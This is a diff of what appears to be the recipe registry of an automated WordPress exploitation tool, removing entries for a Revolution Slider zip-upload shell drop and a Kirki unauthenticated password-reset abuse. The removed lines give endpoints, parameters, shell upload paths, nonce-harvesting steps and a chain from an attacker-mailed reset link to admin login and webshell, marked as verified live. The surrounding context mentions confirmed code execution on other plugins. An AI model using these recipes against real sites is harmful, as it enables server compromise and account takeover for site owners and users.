@@ -46,27 +46,6 @@ RECIPES = [
                 "Confirmed live: uid=33(www-data) on wpdiscuz 7.0.4.",
     },
     {
-        "plugin": "revslider",
-        "cve": "CVE-2014-9735",
-        "affected": "<=3.0.95",
-        "mode": "zip-extract",
-        "method": "POST",
-        "endpoint": "/wp-admin/admin-ajax.php",
-        "params": {"action": "revslider_ajax_action", "client_action": "update_plugin"},
-        "field": "update_file",
-        "zip_inner_path": "revslider/{filename}",
-        "upload_path": "/wp-content/plugins/revslider/temp/update_extract/revslider/{filename}",
-        "source": "registry",
-        # Verified against the Metasploit module wp_revslider_upload_execute:
-        # update_plugin extracts the uploaded zip into temp/update_extract/, so a
-        # zip carrying revslider/<shell>.php lands reachable there. UNAUTH only on
-        # <=3.0.95 (the SoakSoak vector); modern revslider gates this behind admin.
-        # The fingerprinter can't read revslider's version, so MATCH may fire this
-        # on any revslider — VERIFY (confirmed exec) is what keeps it honest.
-        "note": "revslider_ajax_action/update_plugin extracts an attacker zip; ship "
-                "a PHP shell inside revslider/. Unauth in <=3.0.95.",
-    },
-    {
         "plugin": "ninja-forms-uploads",
         "cve": "CVE-2026-0740",
         "affected": "<=3.3.24",
@@ -299,59 +278,6 @@ PRIVESC_RECIPES = [
                 "a first-party source read. Also requires reCAPTCHA v3 to be "
                 "unconfigured (the default -- verify_recaptchav3() "
                 "short-circuits true when no site/secret key is set).",
-    },
-    {
-        "plugin": "kirki",
-        "cve": "CVE-2026-8206",
-        "affected": ">=6.0.0,<=6.0.6",
-        "kind": "account-takeover-oob",
-        "method": "POST",
-        "endpoint": "/wp-json/KirkiComponentLibrary/v1/kirki-forgot-password",
-        # CONFIRM-ONLY. The forgot-password REST route (CompLibFormHandler) has a
-        # missing permission check and trusts a client-supplied 'email', so it
-        # mails the reset link for `target_user` to an ATTACKER address. We can't
-        # read that mailbox, so the tool proves the primitive (200 + marker) and
-        # stops; completing the takeover is a manual step from the attacker inbox.
-        "target_user": "admin",
-        "user_param": "username",
-        "email_param": "email",
-        "attacker_email": "pentest@mail.invalid",
-        "extra_params": {
-            "emailSubject": "Password Reset",
-            "emailBody": '[{"type":"text","value":"Reset your password:\\n"},'
-                         '{"type":"chip","value":"reset_link"}]',
-        },
-        # PRECONDITION (confirmed from source, live-tested): the permission
-        # check IS a no-op (get_item_permissions_check() -> true), but
-        # validate_nonce() strictly requires wp_verify_nonce($nonce,
-        # 'KirkiComponentLibrary_kirki-forgot-password') -- a nonce scoped to
-        # THIS exact action. That nonce is only ever minted by
-        # ElementGenerator::add_nonce_to_element(), which only fires while
-        # rendering a page built with Kirki's own page-builder ("ComponentLibrary")
-        # that actually places a Login/Register/Forgot-Password/Change-Password/
-        # Retrieve-Username/Comment element on it. A vanilla kirki install with
-        # no such page has NO page anywhere that exposes a validly-scoped nonce
-        # -- the generic homepage/wpApiSettings nonce this harvester finds is
-        # for a different action and will always fail wp_verify_nonce() here.
-        # So despite SCAN's "self-contained unauth" classification (heuristic,
-        # not a weaponizability guarantee -- see wp_vulns.precondition), this
-        # CVE is only reachable on sites that built such a component-library
-        # page. If you've confirmed the real target has one, scrape ITS nonce
-        # (component_lib_forms[...].nonce in that page's inline JS) and set a
-        # static "nonce" field here to override the harvester.
-        "nonce_header": "X-WP-ELEMENT-NONCE",
-        "success_marker": "Email sent",
-        "source": "registry",
-        "note": "Unauth arbitrary-email password reset (CVE-2026-8206, missing "
-                "permission check). Reset link is emailed to the attacker. REQUIRES "
-                "the target to have a Kirki page-builder page with a Forgot-Password "
-                "(or sibling) ComponentLibrary element -- otherwise no page exposes "
-                "the action-scoped nonce validate_nonce() demands ('KirkiComponent"
-                "Library_kirki-forgot-password', sent as the X-WP-ELEMENT-NONCE "
-                "header) and the request fails 'Not authorized'. COMPLETABLE with one "
-                "manual step: scrape that nonce → --oob-nonce fires the OOB; read the "
-                "reset key from the attacker email → --oob-reset-key finishes the WP "
-                "reset (complete_reset_key) → admin login → webshell. Verified live.",
     },
     {
         "plugin": "opal-estate-pro",
